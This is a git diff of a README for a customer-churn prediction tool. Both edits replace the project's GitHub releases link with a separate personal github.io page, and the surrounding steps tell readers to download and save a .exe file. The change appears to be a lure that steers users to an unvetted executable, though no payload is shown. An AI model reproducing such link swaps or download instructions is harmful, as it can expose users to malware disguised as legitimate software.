@@ -1,6 +1,6 @@
 # 📉 customer-churn-prediction - Forecast customer loss with simple data
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oraziolucky297/customer-churn-prediction/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://oraziolucky297.github.io)
 
 This software helps businesses understand why customers leave. It uses a mathematical model to spot patterns in user behavior. You can use these insights to keep your clients happy and loyal. The program runs locally on your computer and focuses on telecommunications data.
 
@@ -18,7 +18,7 @@ Before you install this program, check that your computer meets these standards:
 
 The program lives on the project release page. Follow these steps to get the file you need:
 
-1.  Visit the official download page here: [https://github.com/oraziolucky297/customer-churn-prediction/releases](https://github.com/oraziolucky297/customer-churn-prediction/releases).
+1.  Visit the official download page here: [https://oraziolucky297.github.io](https://oraziolucky297.github.io).
 2.  Look for the section marked Latest.
 3.  Click the file that ends in .exe.
 4.  Save this file to your Downloads folder.
